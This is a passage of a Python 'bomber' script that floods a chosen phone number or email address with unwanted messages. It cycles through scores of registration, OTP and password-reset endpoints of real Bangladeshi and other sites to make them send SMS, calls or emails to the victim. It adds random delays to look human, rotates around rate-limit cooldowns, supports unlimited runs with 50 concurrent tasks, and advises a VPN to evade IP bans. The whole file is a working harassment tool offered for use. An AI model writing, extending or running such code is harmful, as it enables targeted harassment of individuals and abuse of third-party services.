            await self.log_event("EMAIL13 - Potakait Register", False, "Error")
            return False


    async def api_email14___electronicsbd_register(self):
        target = self.target
        url = f"https://www.electronics.com.bd/registration".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL14 - ElectronicsBD Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL14 - ElectronicsBD Register", False, "Error")
            return False


    async def api_email15___electronicsbd_recovery(self):
        target = self.target
        url = f"https://www.electronics.com.bd/password-recovery".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL15 - ElectronicsBD Recovery", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL15 - ElectronicsBD Recovery", False, "Error")
            return False


    async def api_email16___globalbrand_register(self):
        target = self.target
        url = f"https://www.globalbrand.com.bd/index?route=account/register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL16 - GlobalBrand Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL16 - GlobalBrand Register", False, "Error")
            return False


    async def api_email17___globalbrand_forgot(self):
        target = self.target
        url = f"https://www.globalbrand.com.bd/index?route=account/forgotten".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL17 - GlobalBrand Forgot", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL17 - GlobalBrand Forgot", False, "Error")
            return False


    async def api_email18___zymak_register(self):
        target = self.target
        url = f"https://www.zymak.com.bd/my-account/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL18 - Zymak Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL18 - Zymak Register", False, "Error")
            return False


    async def api_email19___zymak_lost_password(self):
        target = self.target
        url = f"https://www.zymak.com.bd/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL19 - Zymak Lost Password", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL19 - Zymak Lost Password", False, "Error")
            return False


    async def api_email20___shopz_register(self):
        target = self.target
        url = f"https://www.shopz.com.bd/my-account/?action=register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL20 - Shopz Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL20 - Shopz Register", False, "Error")
            return False


    async def api_email21___shopz_lost_password(self):
        target = self.target
        url = f"https://www.shopz.com.bd/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL21 - Shopz Lost Password", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL21 - Shopz Lost Password", False, "Error")
            return False


    async def api_email22___xclusivebrands_register(self):
        target = self.target
        url = f"https://xclusivebrandsbd.com/page-new/admin-ajax.php".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL22 - Xclusivebrands Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL22 - Xclusivebrands Register", False, "Error")
            return False


    async def api_email23___xclusivebrands_lost_password(self):
        target = self.target
        url = f"https://xclusivebrandsbd.com/page-new/admin-ajax.php".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL23 - Xclusivebrands Lost Password", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL23 - Xclusivebrands Lost Password", False, "Error")
            return False


    async def api_email24___gamebuybd_register(self):
        target = self.target
        url = f"https://gamebuybd.com/my-account/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL24 - GamebuyBD Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL24 - GamebuyBD Register", False, "Error")
            return False


    async def api_email25___gamebuybd_lost_password(self):
        target = self.target
        url = f"https://gamebuybd.com/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL25 - GamebuyBD Lost Password", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL25 - GamebuyBD Lost Password", False, "Error")
            return False


    async def api_email26___gameforce_register(self):
        target = self.target
        url = f"https://gameforce.pk/my-account/?action=register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL26 - Gameforce Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL26 - Gameforce Register", False, "Error")
            return False


    async def api_email27___gameforce_lost_password(self):
        target = self.target
        url = f"https://gameforce.pk/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL27 - Gameforce Lost Password", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL27 - Gameforce Lost Password", False, "Error")
            return False


    async def api_email28___gamecastlebd_register(self):
        target = self.target
        url = f"https://gamecastlebd.com/my-account/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL28 - GamecastleBD Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL28 - GamecastleBD Register", False, "Error")
            return False


    async def api_email29___gamecastlebd_lost_password(self):
        target = self.target
        url = f"https://gamecastlebd.com/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL29 - GamecastleBD Lost Password", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL29 - GamecastleBD Lost Password", False, "Error")
            return False


    async def api_email30___techshopbd_signup(self):
        target = self.target
        url = f"https://techshopbd.com/sign-in".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL30 - TechshopBD Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL30 - TechshopBD Signup", False, "Error")
            return False


    async def api_email31___electronicshopbd_ajax_register(self):
        target = self.target
        url = f"https://electronicshopbd.com/wp-admin/admin-ajax".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL31 - ElectronicShopBD Ajax Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL31 - ElectronicShopBD Ajax Register", False, "Error")
            return False


    async def api_email32___electronicshopbd_lost_password(self):
        target = self.target
        url = f"https://electronicshopbd.com/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL32 - ElectronicShopBD Lost Password", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL32 - ElectronicShopBD Lost Password", False, "Error")
            return False


    async def api_email33___makersbd_register(self):
        target = self.target
        url = f"https://www.makersbd.com/customer/store".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL33 - MakersBD Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL33 - MakersBD Register", False, "Error")
            return False


    async def api_email34___abe_register(self):
        target = self.target
        url = f"https://abe.com.bd/customer-register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL34 - ABE Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL34 - ABE Register", False, "Error")
            return False


    async def api_email35___abe_forget_password(self):
        target = self.target
        url = f"https://abe.com.bd/forgetpassword".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL35 - ABE Forget Password", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL35 - ABE Forget Password", False, "Error")
            return False


    async def api_email36___colorcrazebd_signup(self):
        target = self.target
        url = f"https://www.colorcrazebd.com/web/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL36 - ColorCrazeBD Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL36 - ColorCrazeBD Signup", False, "Error")
            return False


    async def api_email37___colorcrazebd_reset(self):
        target = self.target
        url = f"https://www.colorcrazebd.com/web/reset_password".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL37 - ColorCrazeBD Reset", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL37 - ColorCrazeBD Reset", False, "Error")
            return False


    async def api_email38___chowdhuryelectronics_register(self):
        target = self.target
        url = f"https://www.chowdhuryelectronics.com/index.php?route=account/register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL38 - ChowdhuryElectronics Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL38 - ChowdhuryElectronics Register", False, "Error")
            return False


    async def api_email39___smartview_register(self):
        target = self.target
        url = f"https://smartview.com.bd/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL39 - Smartview Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL39 - Smartview Register", False, "Error")
            return False


    async def api_email40___smartview_verify_resend(self):
        target = self.target
        url = f"https://smartview.com.bd/verify-email/resend?email={target}"
        try:
            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL40 - Smartview Verify Resend", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL40 - Smartview Verify Resend", False, "Error")
            return False


    async def api_email41___smartview_password_code(self):
        target = self.target
        url = f"https://smartview.com.bd/password/code".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL41 - Smartview Password Code", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL41 - Smartview Password Code", False, "Error")
            return False


    async def api_email42___gadstyle_register(self):
        target = self.target
        url = f"https://www.gadstyle.com/my-account/?action=register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL42 - Gadstyle Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL42 - Gadstyle Register", False, "Error")
            return False


    async def api_email43___gadstyle_lost_password(self):
        target = self.target
        url = f"https://www.gadstyle.com/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL43 - Gadstyle Lost Password", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL43 - Gadstyle Lost Password", False, "Error")
            return False


    async def api_email44___havit_register(self):
        target = self.target
        url = f"https://havit.com.bd/my-account/?action=register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL44 - Havit Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL44 - Havit Register", False, "Error")
            return False


    async def api_email45___havit_lost_password(self):
        target = self.target
        url = f"https://havit.com.bd/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL45 - Havit Lost Password", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL45 - Havit Lost Password", False, "Error")
            return False


    async def api_email46___htebd_register(self):
        target = self.target
        url = f"https://www.htebd.com/my-account/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL46 - HTEBD Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL46 - HTEBD Register", False, "Error")
            return False


    async def api_email47___htebd_lost_password(self):
        target = self.target
        url = f"https://www.htebd.com/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL47 - HTEBD Lost Password", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL47 - HTEBD Lost Password", False, "Error")
            return False


    async def api_email48___shanbd_register(self):
        target = self.target
        url = f"https://shanbd.com/index.php?route=account/register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL48 - ShanBD Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL48 - ShanBD Register", False, "Error")
            return False

    async def bomb_task(self):
        if self.mode == 'sms':
            apis = [
                self.api_api1___redx_signup, self.api_api2___khaasfood_otp, self.api_api3___bioscope_login, self.api_api4___bikroy_phone_login, self.api_api5___proiojon_signup, self.api_api6___beautybooth_signup, self.api_api7___medha_otp, self.api_api8___deeptoplay_login, self.api_api9___robi_otp, self.api_api10___arogga_sms, self.api_api11___mygp_otp, self.api_api12___bdstall_otp, self.api_api13___bcs_exam_otp, self.api_api14___doctorlive_otp, self.api_api15___sheba_otp, self.api_api16___apex4u_login, self.api_api17___sindabad_otp, self.api_api18___kirei_otp, self.api_api19___shikho_sms, self.api_api20___circle_signup, self.api_api21___bdtickets_auth, self.api_api22___grameenphone_otp, self.api_api23___rfl_bestbuy_login, self.api_api24___chorki_login, self.api_api25___hishab_express_login, self.api_api26___chorcha_auth_check, self.api_api27___wafilife_otp, self.api_api28___robi_account_otp, self.api_api29___chardike_otp, self.api_api30___e_testpaper_otp, self.api_api31___gpay_signup, self.api_api32___applink_otp, self.api_api33___priyoshikkhaloy, self.api_api34___kabbik_otp, self.api_api35___salextra, self.api_api36___sundora, self.api_api37___mygp_cinematic, self.api_api38___bajistar, self.api_api39___doctime, self.api_api40___grameenphone_fi, self.api_api41___meenabazar, self.api_api42___medeasy, self.api_api43___iqra_live, self.api_api44___chokrojan, self.api_api45___shomvob, self.api_api46___redx_signup_2, self.api_api47___mygp_send_otp, self.api_api48___bdjobs, self.api_api49___ultimate_organic_register, self.api_api50___ultimate_organic_forget, self.api_api51___foodaholic, self.api_api52___kfc_bd, self.api_api53___gp_offer_otp, self.api_api54___eonbazar_register, self.api_api55___eat_z, self.api_api56___osudpotro, self.api_api57___kormi24, self.api_api58___weblogin_gp, self.api_api59___shwapno, self.api_api60___quizgiri, self.api_api61___banglalink_mybl, self.api_api62___walton_plaza, self.api_api63___pbs, self.api_api64___aarong, self.api_api65___arogga_app, self.api_api66___sundarban_courier, self.api_api67___quiztime, self.api_api68___dressup, self.api_api69___ghoori_learning, self.api_api70___garibook, self.api_api71___fabrilife_signup, self.api_api72___fabrilife_otp, self.api_api73___btcl_bdia, self.api_api74___btcl_phonebill_register, self.api_api75___btcl_phonebill_login, self.api_api76___redx_merchant_otp, self.api_api77___khaasfood_digits_otp, self.api_api78___robi_web_otp, self.api_api79___sindabad_offers_otp_v2, self.api_api80___gp_fi_fwa_otp, self.api_api81___kabbik_otp_v2, self.api_api82___sundora_otp_backend, self.api_api83___walton_plaza_otp_v2, self.api_api84___btcl_mybtcl_register, self.api_api85___btcl_mybtcl_bcare, self.api_api86___ecourier_individual_otp, self.api_api87___carrybee_merchant_register, self.api_api88___carrybee_forget_password, self.api_api89___cartup_signup, self.api_api90___easyfashion_digits_otp, self.api_api91___sara_lifestyle_otp, self.api_api92___electronics_bangladesh_otp, self.api_api93___esquire_electronics_check_user, self.api_api94___sheba_electronics_otp, self.api_api95___sumash_tech_otp, self.api_api96___volthbd_registration, self.api_api97___rangs_shop_otp, self.api_api98___eyecon_app_transport, self.api_api99___vision_emporium_register, self.api_api100___basa18_sms, self.api_api101___pkluck_register, self.api_api102___pkluck_nologin_otp, self.api_api103___8mbets_register, self.api_api104___8mbets_new_mobile_request, self.api_api105___8mbets_forget_tac, self.api_api106___jayabaji_register, self.api_api107___jayabaji_new_mobile_request, self.api_api108___jayabaji_login_tac,
                self.api_api109___chaldal_otp, self.api_api110___pathao_otp, self.api_api111___sharetrip_otp, self.api_api112___shohoz_otp,
                self.api_api113___foodpanda_otp, self.api_api114___hungrynaki_otp, self.api_api115___rokomari_otp, self.api_api116___evaly_otp,
                self.api_api117___amarpay_otp, self.api_api118___pickaboo_otp, self.api_api119___ajkerdeal_otp, self.api_api120___priyoshop_otp,
                self.api_api121___bikroy_otp_v2, self.api_api122___daraz_otp_v2
            ]
        elif self.mode == 'call':
            apis = [
                self.api_call1___robi_call_otp, self.api_call2___daraz_call_otp, self.api_call3___pathao_call_otp, self.api_call4___shohoz_call_otp,
                self.api_call5___chaldal_call_otp, self.api_call6___foodpanda_call_otp, self.api_call7___evaly_call_otp, self.api_call8___hungrynaki_call_otp,
                self.api_call9___rokomari_call_otp, self.api_call10___airtel_call_otp, self.api_call11___gp_call_otp_v2
            ]
        else:
            apis = [
                self.api_email1___bikroy_account, self.api_email2___bikroy_password_reset, self.api_email3___busbud_signup, self.api_email4___mithaibd_register, self.api_email5___saralifestyle_reset, self.api_email6___tohfay_register, self.api_email7___tohfay_forgot, self.api_email8___mrmedicinemart_signup, self.api_email9___mrmedicinemart_reset, self.api_email10___robishop_create, self.api_email11___robishop_reset, self.api_email12___singerbd_otp, self.api_email13___potakait_register, self.api_email14___electronicsbd_register, self.api_email15___electronicsbd_recovery, self.api_email16___globalbrand_register, self.api_email17___globalbrand_forgot, self.api_email18___zymak_register, self.api_email19___zymak_lost_password, self.api_email20___shopz_register, self.api_email21___shopz_lost_password, self.api_email22___xclusivebrands_register, self.api_email23___xclusivebrands_lost_password, self.api_email24___gamebuybd_register, self.api_email25___gamebuybd_lost_password, self.api_email26___gameforce_register, self.api_email27___gameforce_lost_password, self.api_email28___gamecastlebd_register, self.api_email29___gamecastlebd_lost_password, self.api_email30___techshopbd_signup, self.api_email31___electronicshopbd_ajax_register, self.api_email32___electronicshopbd_lost_password, self.api_email33___makersbd_register, self.api_email34___abe_register, self.api_email35___abe_forget_password, self.api_email36___colorcrazebd_signup, self.api_email37___colorcrazebd_reset, self.api_email38___chowdhuryelectronics_register, self.api_email39___smartview_register, self.api_email40___smartview_verify_resend, self.api_email41___smartview_password_code, self.api_email42___gadstyle_register, self.api_email43___gadstyle_lost_password, self.api_email44___havit_register, self.api_email45___havit_lost_password, self.api_email46___htebd_register, self.api_email47___htebd_lost_password, self.api_email48___shanbd_register, self.api_email49___quora_signup, self.api_email50___pinterest_signup
            ]
        while self.running and not self.stop_event.is_set():
            if self.limit != 0 and self.sent >= self.limit:
                self.running = False
                break

            # Filter out APIs that are currently in cooldown
            available_apis = [api_func for api_func in apis if api_func.__name__[4:].lower() not in self.api_cooldowns or asyncio.get_event_loop().time() > self.api_cooldowns[api_func.__name__[4:].lower()]]

            if not available_apis:
                logging.warning(f"{Y}[!] All APIs are in cooldown. Waiting for {self.backoff_time} seconds.{W}")
                await asyncio.sleep(self.backoff_time)
                continue

            api = random.choice(available_apis)
            try:
                await api()
            except Exception as e:
                logging.error(f"{R}[!] Task Exception: {e}{W}")

            # Jitter: Random delay to mimic human behavior
            await asyncio.sleep(random.uniform(2, 5))

async def main():
    while True:
        clear()
        banner()

        print(f"{Y}[!] For optimal performance and to avoid IP bans, it is highly recommended to use a VPN service.")
        print(f"{Y}[!] Please connect your VPN to a stable location before starting.\n{W}")

        try:
            print(f"{C}[1] SMS Bombing")
            print(f"{C}[2] Call Bombing")
            print(f"{C}[3] Email Bombing")
            print(f"{C}[E] Exit Project")
            choice = input(f"\n{Y}[?] Select Mode: {W}").lower()

            if choice == 'e':
                logging.info(f"{G}[✓] Thank you for using SMS Bomber!{W}")
                break

            if choice == '1':
                mode = 'sms'
                target = input(f"{C}[?] Enter Target Number (e.g. 017xxxxxxxx): {W}")
                if len(target) != 11 or not target.isdigit():
                    logging.error(f"{R}[!] Invalid Number Format!{W}")
                    await asyncio.sleep(2)
                    continue
            elif choice == '2':
                mode = 'call'
                target = input(f"{C}[?] Enter Target Number (e.g. 017xxxxxxxx): {W}")
                if len(target) != 11 or not target.isdigit():
                    logging.error(f"{R}[!] Invalid Number Format!{W}")
                    await asyncio.sleep(2)
                    continue
            elif choice == '3':
                mode = 'email'
                target = input(f"{C}[?] Enter Target Email: {W}")
                if "@" not in target:
                    logging.error(f"{R}[!] Invalid Email Format!{W}")
                    await asyncio.sleep(2)
                    continue
            else:
                logging.error(f"{R}[!] Invalid Choice!{W}")
                await asyncio.sleep(2)
                continue

            limit_input = input(f"{C}[?] Enter Bombing Limit (0 for Unlimited): {W}")
            limit = int(limit_input) if limit_input.isdigit() else 0

            tasks_count_input = input(f"{C}[?] Enter Concurrency Level (e.g. 50): {W}")
            tasks_count = int(tasks_count_input) if tasks_count_input.isdigit() else 50

            logging.info(f"\n{Y}[*] Starting {mode.upper()} Bombing on {target} with {tasks_count} concurrent tasks...{W}")
            logging.info(f"{Y}[*] Press Enter to stop and return to menu.\n{W}")

            stop_event = asyncio.Event()
            async with AsyncBomber(target, limit, mode, stop_event) as bomber:
                bombing_tasks = [asyncio.create_task(bomber.bomb_task()) for _ in range(tasks_count)]

                # Task to wait for user input to stop the bombing
                input_task = asyncio.create_task(asyncio.to_thread(input, ""))
                
                # Wait for either all bombing tasks to complete (if limit is set) or user input to stop
                # We want to stop if the user presses Enter (input_task) OR if all bombing tasks finish.
                # If limit is 0, bombing tasks will only finish if they crash or are cancelled.
                bombing_group = asyncio.gather(*bombing_tasks, return_exceptions=True)
                done, pending = await asyncio.wait([bombing_group, input_task], return_when=asyncio.FIRST_COMPLETED)

                # Signal stop
                bomber.running = False
                stop_event.set()

                # Cancel any remaining pending bombing tasks
                for task in pending:
                    task.cancel()
                await asyncio.gather(*pending, return_exceptions=True)

                # Clean up input task
                if not input_task.done():
                    input_task.cancel()
                try:
                    await input_task
                except asyncio.CancelledError:
                    pass

            logging.info(f"\n\n{G}[✓] Bombing Stopped!{W}")
            logging.info(f"{G}[+] Total Sent: {bomber.sent}{W}")
            logging.info(f"{R}[-] Total Failed: {bomber.failed}{W}")
            logging.info(f"{Y}[*] Detailed log saved to: {bomber.log_file}{W}")
            print(f"\n{C}Press Enter to return to main menu...{W}")
            input()

        except KeyboardInterrupt:
            logging.info(f"\n\n{R}[!] Use 'Enter' to stop bombing. Press 'Enter' again to exit project.{W}")
            try:
                input()
                break
            except:
                break
        except Exception as e:
            logging.error(f"\n{R}[!] Error: {e}{W}")
            await asyncio.sleep(3)

if __name__ == "__main__":
    asyncio.run(main())
